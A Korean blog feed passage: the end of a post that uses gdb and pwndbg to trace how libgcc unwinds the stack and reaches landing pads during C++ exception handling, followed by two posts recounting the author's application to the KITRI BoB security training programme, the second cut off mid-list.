<p>편의를 위해 다음과 같이 <code>.gdbinit</code> 파일을 작성하겠습니다. 이후 <code>gdb</code> 를 실행하면 즉시 중단점으로 이동합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file eh1</span><br><span class="line">start</span><br><span class="line"></span><br><span class="line">break *(_Unwind_RaiseException+310)</span><br><span class="line">break *(_Unwind_RaiseException+332)</span><br><span class="line">break *(_Unwind_RaiseException+356)</span><br><span class="line">break *(_Unwind_RaiseException+812)</span><br><span class="line">break *(_Unwind_RaiseException+905)</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>
<p><code>gdb</code> 를 실행하면 <code>uw_frame_state_for</code> 함수를 호출하는 1번째 중단점에서 멈춥니다. <code>context-&gt;ra</code> 필드를 확인하면 <code>__cxa_throw</code> 함수에서 <code>_Unwind_RaiseException</code> 함수를 호출한 직후의 주소입니다. 현재 <code>context</code> 구조체는 <code>_Unwind_RaiseException</code> 함수의 프레임을 나타내고 있는 것입니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x7f845bf3b086 &lt;_Unwind_RaiseException+310&gt;    call   0x7f845bf39800                &lt;0x7f845bf39800&gt;</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b08b &lt;_Unwind_RaiseException+315&gt;    cmp    eax, 5</span><br><span class="line">   0x7f845bf3b08e &lt;_Unwind_RaiseException+318&gt;    je     _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e20  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e00  0x00007ffc2f4d0e08</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e28  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e30  0x00007f845bfef69c</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x7f845bfef69c &lt;__cxa_throw+60&gt;: mov    rdi,rbp</span><br><span class="line">   0x7f845bfef69f &lt;__cxa_throw+63&gt;: call   0x7f845bfdf690 &lt;__cxa_begin_catch@plt&gt;</span><br><span class="line">   0x7f845bfef6a4 &lt;__cxa_throw+68&gt;: call   0x7f845bfdf180 &lt;std::terminate()@plt&gt;</span><br><span class="line">   0x7f845bfef6a9:  nop    DWORD PTR [rax+0x0]</span><br></pre></td></tr></table></figure>
<p><code>continue</code> 커맨드로 계속 실행하면 personality 루틴이 존재하지 않아 다시 1번째 중단점으로 돌아옵니다. 이번에는 <code>context-&gt;ra</code> 필드가 <code>func2</code> 함수에서 <code>__cxa_throw</code> 함수를 호출한 직후의 주소입니다. 반복문에서 스택을 되감으면서 <code>context</code> 구조체가 <code>__cxa_throw</code> 함수의 프레임을 나타내고 있음을 확인할 수 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e30  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e48  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e50  0x0000000000401265</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x401265 &lt;func2(int)+79&gt;:    nop</span><br><span class="line">   0x401266 &lt;func2(int)+80&gt;:    leave</span><br><span class="line">   0x401267 &lt;func2(int)+81&gt;:    ret</span><br><span class="line">   0x401268 &lt;func()&gt;:   endbr64</span><br></pre></td></tr></table></figure>
<p>이번에도 personality 루틴이 존재하지 않아 1번째 중단점으로 돌아옵니다. <code>context</code> 구조체는 이제 <code>func2</code> 함수의 프레임을 나타내고 있습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x4012a6 &lt;func()+62&gt;:    lea    rax,[rbp-0x19]</span><br><span class="line">   0x4012aa &lt;func()+66&gt;:    mov    rdi,rax</span><br><span class="line">   0x4012ad &lt;func()+69&gt;:    call   0x401382 &lt;MyClass::~MyClass()&gt;</span><br><span class="line">   0x4012b2 &lt;func()+74&gt;:    nop</span><br></pre></td></tr></table></figure>
<p><code>func2</code> 함수의 프레임에서 스택을 되감으면 <code>func</code> 함수 내의 <code>MyClass</code> 객체를 소멸하는 랜딩 패드로 이동해야 합니다. 이를 위해 personality 루틴의 주소가 <code>fs-&gt;personality</code> 필드에 대입되어 계속 실행하면 3번째 중단점에서 멈추게 됩니다. 다만 personality 루틴의 호출 이후에도 <code>context-&gt;ra</code> 필드가 랜딩 패드의 주소로 바뀌지는 않습니다. 이는 지금이 search 단계이기 때문입니다. 실제 랜딩 패드 주소를 대입하여 실행 흐름을 옮기는 작업은 cleanup 단계에서 이루어집니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 4, 0x00007f845bf3b0b4 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x7f845bf3b0b4 &lt;_Unwind_RaiseException+356&gt;    call   rax                           &lt;__gxx_personality_v0&gt;</span><br><span class="line">        rdi: 0x1</span><br><span class="line">        rsi: 0x1</span><br><span class="line">        rdx: 0x474e5543432b2b00</span><br><span class="line">        rcx: 0x135f320 ◂— 0x474e5543432b2b00</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b0b6 &lt;_Unwind_RaiseException+358&gt;    cmp    eax, 6</span><br><span class="line">   0x7f845bf3b0b9 &lt;_Unwind_RaiseException+361&gt;    je     _Unwind_RaiseException+544                &lt;_Unwind_RaiseException+544&gt;</span><br><span class="line">pwndbg&gt; set $context=$r8</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; x/20gx $context</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6</span><br></pre></td></tr></table></figure>
<p>Personality 루틴의 반환값은 <code>_URC_CONTINUE_UNWIND</code> 에 해당하는 8입니다. 스택 되감기를 반복하여 <code>func</code> 함수의 프레임으로 이동합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x8                 8</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x00007f845bf3b086 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x7f845bf3b086 &lt;_Unwind_RaiseException+310&gt;    call   0x7f845bf39800                &lt;0x7f845bf39800&gt;</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b08b &lt;_Unwind_RaiseException+315&gt;    cmp    eax, 5</span><br><span class="line">   0x7f845bf3b08e &lt;_Unwind_RaiseException+318&gt;    je     _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;</span><br><span class="line">pwndbg&gt; x/20gx $rdi</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0e88</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e90  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e98  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0ea0  0x000000000040130c</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($rdi+8*19)</span><br><span class="line">   0x40130c &lt;main+30&gt;:  mov    eax,0x0</span><br><span class="line">   0x401311 &lt;main+35&gt;:  jmp    0x40135b &lt;main+109&gt;</span><br><span class="line">   0x401313 &lt;main+37&gt;:  endbr64</span><br><span class="line">   0x401317 &lt;main+41&gt;:  cmp    rdx,0x1</span><br></pre></td></tr></table></figure>
<p><code>func</code> 함수에서 스택을 되감으면 <code>main</code> 함수의 catch 블록으로 이동해야 합니다. 계속 실행하면 personality 루틴이 호출되며, <code>_URC_HANDLER_FOUND</code> 에 해당하는 6을 반환합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x7f845bf3b0b4 &lt;_Unwind_RaiseException+356&gt;    call   rax                           &lt;__gxx_personality_v0&gt;</span><br><span class="line">        rdi: 0x1</span><br><span class="line">        rsi: 0x1</span><br><span class="line">        rdx: 0x474e5543432b2b00</span><br><span class="line">        rcx: 0x135f320 ◂— 0x474e5543432b2b00</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b0b6 &lt;_Unwind_RaiseException+358&gt;    cmp    eax, 6</span><br><span class="line">   0x7f845bf3b0b9 &lt;_Unwind_RaiseException+361&gt;    je     _Unwind_RaiseException+544                &lt;_Unwind_RaiseException+544&gt;</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x6                 6</span><br></pre></td></tr></table></figure>
<p>search 단계의 성공으로 반복문을 탈출합니다. 계속 실행하면 <code>_Unwind_RaiseException_Phase2</code> 함수를 호출하는 4번째 중단점에서 멈추게 됩니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 5, 0x00007f845bf3b27c in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line"> ► 0x7f845bf3b27c &lt;_Unwind_RaiseException+812&gt;    call   0x7f845bf3ab50                &lt;0x7f845bf3ab50&gt;</span><br><span class="line"></span><br><span class="line">   0x7f845bf3b281 &lt;_Unwind_RaiseException+817&gt;    cmp    eax, 7</span><br><span class="line">   0x7f845bf3b284 &lt;_Unwind_RaiseException+820&gt;    jne    _Unwind_RaiseException+435                &lt;_Unwind_RaiseException+435&gt;</span><br></pre></td></tr></table></figure>
<p><code>_Unwind_RaiseException_Phase2</code> 함수 내에서 personality 루틴을 호출하는 부분에 추가로 중단점을 두겠습니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/43i 0x7f845bf3ab50</span><br><span class="line">   0x7f845bf3ab50:  push   r15</span><br><span class="line">   0x7f845bf3ab52:  push   r14</span><br><span class="line">   # ...</span><br><span class="line">   0x7f845bf3abe5:  or     esi,0x2</span><br><span class="line">   0x7f845bf3abe8:  mov    edi,0x1</span><br><span class="line">   0x7f845bf3abed:  call   rax                    # call personality routine </span><br><span class="line">   0x7f845bf3abef:  cmp    eax,0x7</span><br><span class="line">   0x7f845bf3abf2:  je     0x7f845bf3ac90</span><br><span class="line">pwndbg&gt; break *0x7f845bf3abed</span><br><span class="line">Breakpoint 7 at 0x7f845bf3abed</span><br></pre></td></tr></table></figure>
<p>계속 실행하면 cleanup 단계를 수행하는 <code>_Unwind_RaiseException_Phase2</code> 함수 내부로 진입합니다. 새로 설정한 중단점에서 멈추며, personality 루틴을 호출하기 전 <code>context-&gt;ra</code> 필드의 값은 <code>0x4012a6</code> 으로 <code>func</code> 함수에서 <code>func2</code> 함수를 호출한 직후의 주소입니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 7, 0x00007f845bf3abed in ?? () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; pdisass 1</span><br><span class="line">   0x7f845bf3abe8    mov    edi, 1</span><br><span class="line"> ► 0x7f845bf3abed    call   rax                           &lt;__gxx_personality_v0&gt;</span><br><span class="line">        rdi: 0x1</span><br><span class="line">        rsi: 0x2</span><br><span class="line">        rdx: 0x474e5543432b2b00</span><br><span class="line">        rcx: 0x135f320 ◂— 0x474e5543432b2b00</span><br><span class="line"></span><br><span class="line">   0x7f845bf3abef    cmp    eax, 7</span><br><span class="line">pwndbg&gt; x/20gx $context</span><br><span class="line">0x7ffc2f4d0b70: 0x00007ffc2f4d0de8  0x00007ffc2f4d0df0</span><br><span class="line">0x7ffc2f4d0b80: 0x0000000000000000  0x00007ffc2f4d0df8</span><br><span class="line">0x7ffc2f4d0b90: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0ba0: 0x00007ffc2f4d0e60  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bb0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bc0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0bd0: 0x00007ffc2f4d0e38  0x00007ffc2f4d0e40</span><br><span class="line">0x7ffc2f4d0be0: 0x00007ffc2f4d0e10  0x00007ffc2f4d0e18</span><br><span class="line">0x7ffc2f4d0bf0: 0x00007ffc2f4d0e68  0x0000000000000000</span><br><span class="line">0x7ffc2f4d0c00: 0x00007ffc2f4d0e70  0x00000000004012a6</span><br><span class="line">pwndbg&gt; x/4i *(uint64_t *)($context+8*19)</span><br><span class="line">   0x4012a6 &lt;func()+62&gt;:    lea    rax,[rbp-0x19]</span><br><span class="line">   0x4012aa &lt;func()+66&gt;:    mov    rdi,rax</span><br><span class="line">   0x4012ad &lt;func()+69&gt;:    call   0x401382 &lt;MyClass::~MyClass()&gt;</span><br><span class="line">   0x4012b2 &lt;func()+74&gt;:    nop</span><br></pre></td></tr></table></figure>
<p>Personality 루틴을 호출하면 <code>_URC_INSTALL_CONTEXT</code> 에 해당하는 7을 반환하며, <code>context-&gt;ra</code> 필드의 값이 <code>0x4012c4</code> 로 바뀌어 있습니다. 이는 <code>func</code> 함수에서 <code>MyClass</code> 의 소멸자를 호출하는 랜딩 패드의 시작 주소입니다. 이와 같이 cleanup 단계에서는 LSDA를 해석하여 랜딩 패드의 주소를 찾아 <code>context-&gt;ra</code> 필드에 대입하여 실행 흐름이 랜딩 패드로 옮겨질 수 있도록 합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 6, 0x00007f845bf3b2d9 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; ni</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            0x7                 7</span><br><span class="line">pwndbg&gt; x/8i *(uint64_t *)($context+8*19)</span><br><span class="line">   0x4012c4 &lt;func()+92&gt;:    endbr64</span><br><span class="line">   0x4012c8 &lt;func()+96&gt;:    mov    rbx,rax</span><br><span class="line">   0x4012cb &lt;func()+99&gt;:    lea    rax,[rbp-0x19]</span><br><span class="line">   0x4012cf &lt;func()+103&gt;:   mov    rdi,rax</span><br><span class="line">   0x4012d2 &lt;func()+106&gt;:   call   0x401382 &lt;MyClass::~MyClass()&gt;</span><br><span class="line">   0x4012d7 &lt;func()+111&gt;:   mov    rax,rbx</span><br><span class="line">   0x4012da &lt;func()+114&gt;:   mov    rdi,rax</span><br><span class="line">   0x4012dd &lt;func()+117&gt;:   call   0x401120 &lt;_Unwind_Resume@plt&gt;</span><br></pre></td></tr></table></figure>
<p>cleanup 단계의 성공으로 반복문을 탈출합니다. 계속 실행하면 <code>uw_install_context</code> 매크로의 내부인 마지막 중단점에서 멈추게 됩니다. 이 매크로는 <code>context</code> 구조체의 내용을 실제 레지스터에 반영하는 코드로 구성되어 있습니다. 매크로의 끝에서 점프를 수행하면 랜딩 패드로 실행 흐름을 옮기면서 <code>MyClass</code> 의 소멸차를 호출하는 코드를 실행합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Breakpoint 6, 0x00007f845bf3b2d9 in _Unwind_RaiseException () from /lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">pwndbg&gt; emu 3</span><br><span class="line"> ► 0x7f845bf3b2d9 &lt;_Unwind_RaiseException+905&gt;    jmp    rcx                           &lt;func()+92&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x4012c4       &lt;func()+92&gt;                     endbr64</span><br><span class="line">   0x4012c8       &lt;func()+96&gt;                     mov    rbx, rax</span><br><span class="line">   0x4012cb       &lt;func()+99&gt;                     lea    rax, [rbp - 0x19]</span><br><span class="line">   0x4012cf       &lt;func()+103&gt;                    mov    rdi, rax</span><br><span class="line">   0x4012d2       &lt;func()+106&gt;                    call   MyClass::~MyClass()                      &lt;MyClass::~MyClass()&gt;</span><br><span class="line"></span><br><span class="line">   0x4012d7       &lt;func()+111&gt;                    mov    rax, rbx</span><br></pre></td></tr></table></figure>
<h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">결론</h2>
<p>C++은 예외가 없으면 오버헤드도 발생하지 않는 zero-cost 예외 처리 방식을 사용하고 있습니다. 런타임에 예외가 발생하면 스택 되감기를 수행하면서 바이너리에 미리 준비된 랜딩 패드를 순서대로 방문하는데, 이 과정에서 unwind 라이브러리와 C++ ABI의 도움을 받습니다. 스택을 되감기 위해서는 특정 주소에 대한 이전 프레임을 복원할 수 있어야 합니다. 컴파일러가 바이너리에 이전 프레임을 복원하는 방법을 인코딩하면, unwind 라이브러리가 이를 해석하여 스택을 되감고 C++ ABI의 personality 루틴이 랜딩 패드로 실행 흐름을 옮김을 동적 분석을 통해 확인할 수 있었습니다.</p>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] S. B. Lippman, J. Lajoie and B. E. Moo, “18.1 Exception Handling,” in <em>C++ Primer</em>, 5th ed. Boston, MA: Addison-Wesley, 2012, pp. 772-784.<br>
[2] <em>DWARF Debugging Information Format, Version 5</em>, DWARF Debugging Information Format Committee, 2012.<br>
[3] <em>Exception Handling</em>, Itanium C++ ABI, 2012. [Online] Available: <a href="https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html">https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html</a><br>
[4] <em>Exception Handling Tables</em>, HP aC++ A.01.15 - Public version, 2012. [Online] Available: <a href="https://itanium-cxx-abi.github.io/cxx-abi/exceptions.pdf">https://itanium-cxx-abi.github.io/cxx-abi/exceptions.pdf</a></p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>Reverse Engineering</category>
      </categories>
  </entry>
  <entry>
    <title>KITRI BoB 9기 최종합격 / 서류, 면접 후기 (1)</title>
    <url>/2022/06/09/kitri-bob-9-1/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p><img src="/images/kitri-bob-9-1/1.png" alt="1.png"></p>
<p>감사하게도 적지 않은 분들의 큰 도움으로 KITRI BoB 9기에 최종 합격할 수 있었습니다. 이번 글에서는 그간 준비 과정과 서류, 면접 경험을 공유하여 다른 분들께 많은 도움이 되었으면 합니다.</p>
<h2 id="%EC%A4%80%EB%B9%84-%EA%B3%BC%EC%A0%95" tabindex="-1">준비 과정</h2>
<ul>
<li>공부는 고등학생 때 웹 해킹을 잠깐, 대학 진학 후 시스템 해킹을 일년 반 정도 공부했습니다.</li>
<li>공부한 내용을 주로 동아리 스터디에서 공유하면서, 동아리 활동 경험 부분에서 할 이야기가 많아졌습니다.</li>
<li>주로 워게임 문제를 풀면서 공부한 내용을 복습했습니다.
<ul>
<li><a href="http://pwnable.kr/">pwnable.kr</a>을 절반, <a href="https://pwnable.xyz/">pwnable.xyz</a>는 7문제 정도 제외하고 전부 풀었습니다.</li>
</ul>
</li>
</ul>
<h2 id="%EC%84%9C%EB%A5%98-%EC%A0%84%ED%98%95" tabindex="-1">서류 전형</h2>
<ul>
<li>자기소개서는 7개 문항에 각 1,000자씩으로 작년과 동일했습니다.</li>
<li>자기소개
<ul>
<li>해킹을 접하고 공부하게 된 계기, 대학교 1~2학년 때 공부하고 활동한 이야기를 주로 적었습니다.</li>
<li>저는 공부할 때 문서나 백서, 전공서적을 참고하는 것을 중요하게 생각하는데, 그 부분을 강조하였습니다.</li>
<li>보안과 관련된 어떤 주제를 왜, 어떻게 공부해서 어떤 성과를 냈는지가 충분히 포함되면 좋을 듯 합니다.</li>
</ul>
</li>
<li>본인이 이룬 가장 큰 성과 및 사례
<ul>
<li>전공수업에서 학교 포털시스템을 모의해킹할 기회가 있었는데, 그 때 경험과 느낀 점을 적었습니다.</li>
<li>이 항목은 개인차가 크겠지만, 어떤 계기로 어떤 기술을 사용했고, 어떤 것을 배웠다는 내용이면 좋을 듯 합니다.</li>
</ul>
</li>
<li>지원 동기
<ul>
<li>저는 크게 지원한 이유와, BoB에서 나 자신을 위해, 사회를 위해 하고 싶은 일로 나누었습니다.</li>
<li>지원 동기에서 열정과 목표가 드러나고, 그 목표를 실현 가능하다는 실력이나 잠재력의 근거가 다른 항목과 같이 충분히 드러나면 좋을 듯 합니다.</li>
</ul>
</li>
<li>합격 후 포부
<ul>
<li>CTF에 나가고 싶다, 현실 사례를 이야기하며 이런 프로젝트를 해보고 싶다는 내용을 주로 적었습니다.</li>
<li>이 항목은 정말 BoB에서 하고 싶은 일을 조리있게 적으면 될 것 같습니다.</li>
</ul>
</li>
<li>관심 분야
<ul>
<li>저는 시스템 해킹 분야에서 공부하며 기록을 남기고, 동아리원들과 스터디한 이야기를 적었습니다.</li>
<li>지원한 트랙과 관련하여 경험이 어느 정도 있는 분들은 상세한 경험을 관심분야 항목에 녹여내면 좋을 듯 합니다.</li>
<li>경험이 많지 않은 분들도 이런 분야에 흥미가 있으며, 그래서 이런 내용을 지금 공부하고 있다는 내용이 있으면 충분합니다.</li>
</ul>
</li>
<li>BoB 학습계획
<ul>
<li>BoB 홈페이지에서는 공통 교육 기간에 모든 트랙의 기초 수업을, 트랙별 교육 단계에서 심화된 내용을 교육한다고 밝히고 있습니다.</li>
<li>따라서 공통 교육 단계에서 기초적인 소양을 키우고, 트랙별 교육 단계에서 본인이 관심있는 분야의 이떤 세부적인 주제를 공부하겠다는 내용이 좋을 듯 합니다.</li>
</ul>
</li>
<li>진로 계획
<ul>
<li>진로 계획은 학습 계획과 달리 BoB 이수 이후에 초점을 맞춘 항목입니다.</li>
<li>그러므로 랩 인턴, 취업, 연구 등을 통해 관심있는 분야의 최신 주제를 공부하고 전문가가 되겠다는 포부를 밝히면 좋을 듯 합니다.</li>
</ul>
</li>
</ul>
<p>필기와 면접 이야기는 <a href="/2022/06/18/kitri-bob-9-2/">다음 글</a>에서 계속하겠습니다. 서류 전형과 관련해 질문이 있으시면, 댓글이나 이메일 통해서 최대한 답변 드리겠습니다!</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Thoughts</category>
      </categories>
  </entry>
  <entry>
    <title>KITRI BoB 9기 최종합격 / 서류, 면접 후기 (2)</title>
    <url>/2022/06/18/kitri-bob-9-2/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p><a href="/2022/06/09/kitri-bob-9-1/">이전 글</a>에서 이어지는 KITRI BoB 합격 후기입니다. 이번 글에서는 제가 지원한 취약점분석 트랙의 필기, 면접 전형 경험을 공유해보려고 합니다.</p>
<p><img src="/images/kitri-bob-9-2/1.png" alt="1.png"></p>
<h2 id="%ED%95%84%EA%B8%B0-%EC%A0%84%ED%98%95" tabindex="-1">필기 전형</h2>
<ul>
<li>올해 처음 도입된 CTF형 필기 전형입니다.</li>
<li>기존 필기 전형과 유사한 객관식 몇 문제를 제외하면, 실제 파일을 주고 플래그를 찾아 write-up과 함께 업로드해야 합니다.
<ul>
<li>시스템 해킹, 웹 해킹, 리버싱, 암호학과 알고리즘 문제까지 출제되었습니다.</li>
</ul>
</li>
<li>솔직히 말해서 제일 쉬운 한 문제 빼고는 전부 시간 내에 풀지 못했습니다.</li>
<li>다음날 멘탈을 잡고 나머지 문제를 복기한 결과 이런 결론을 얻었습니다.
<ul>
<li>생각보다 문제는 어렵지 않았습니다.</li>
<li>그런데 불친절한 문제는 꽤 많습니다. (e.g. 정적 컴파일된 바이너리)</li>
</ul>
</li>
<li>CTF 경험이 많지 않은 초심자 분들은 분석해 볼 만한 문제를 하나 잡고 끝까지 파고드는 전략이 유효할 것 같습니다.
<ul>
<li>시간이 꽤 촉박하니, 몇 시간씩 걸릴 것 같은 문제는 과감히 포기하는 편이 나을 수도 있습니다.</li>
</ul>
</li>
<li>그리고 필기 전형 후에도 풀지 못한 문제를 꼭 다시 살펴봐야 면접 전형에서도 도움이 될 가능성이 높습니다.
<ul>
<li>일부 멘토님은 고난도 문제의 풀이 방법을 물어보는 경우가 있습니다.<br>
<br></li>
</ul>
</li>
</ul>
<p><img src="/images/kitri-bob-9-2/2.png" alt="2.png"></p>
<h2 id="%EB%A9%B4%EC%A0%91-%EC%A0%84%ED%98%95" tabindex="-1">면접 전형</h2>
<ul>
<li>면접도 바뀌어, 기존의 학습 계획이나 하고 싶은 프로젝트 발표는 진행하지 않습니다.</li>
<li>3분 자기소개가 추가되었고, 취약점분석 트랙은 발표자료 없이 구두로 진행합니다.
<ul>
<li>3분 자기소개를 준비하면서 유튜브 인싸담당자 님의 <a href="https://www.youtube.com/watch?v=DSBJXuDyDOY&amp;t=55s">영상</a>이 많은 도움이 되었습니다.</li>
